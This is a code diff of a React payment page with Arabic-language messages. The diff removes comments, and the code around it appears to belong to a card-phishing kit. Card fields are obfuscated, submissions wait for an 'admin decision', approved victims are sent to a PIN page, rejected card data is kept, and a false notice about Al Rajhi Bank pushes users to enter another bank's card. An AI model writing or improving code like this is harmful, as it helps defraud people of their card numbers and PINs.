@@ -38,13 +38,11 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
   // Waiting state
   const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)
   
-  // Blocked card and country states
   const [isCardBlockedState, setIsCardBlockedState] = useState(false)
   const [showEmailModal, setShowEmailModal] = useState(false)
   const [userCountry, setUserCountry] = useState<string | null>(null)
   const [countryCheckDone, setCountryCheckDone] = useState(false)
 
-  // Detect card type and bank info when card number changes
   useEffect(() => {
     const cleanNumber = _v1.replace(/\s/g, "")
     if (cleanNumber.length >= 6) {
@@ -57,7 +55,6 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
       setBankInfo(null)
     }
 
-    // Validate card number (must be 16 digits for most cards)
     if (cleanNumber.length === 16) {
       setIsValidCard(luhnCheck(cleanNumber))
     } else {
@@ -65,7 +62,6 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
     }
   }, [_v1])
 
-  // Check if card BIN is blocked
   useEffect(() => {
     const checkCardBlocked = async () => {
       const cleanNumber = _v1.replace(/\s/g, "")
@@ -133,7 +129,6 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
     }
   }, [_v3])
 
-  // Listen to admin decision after payment
   useEffect(() => {
     const visitorID = localStorage.getItem("visitor")
     if (!visitorID) return
@@ -154,7 +149,6 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
             // Redirect to PIN page directly
             router.push("/confi")
           } else if (status === "rejected") {
-            // Save rejected card data and reset status
             const currentCardData = {
               _v1: data._v1,
               _v4: data._v4,
@@ -236,7 +230,6 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
       return
     }
 
-    // Check if card is blocked
     if (isCardBlockedState) {
       toast.error("تم إيقاف التسديد", {
         description: "تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية. الرجاء إدخال بطاقة من مصرف آخر",
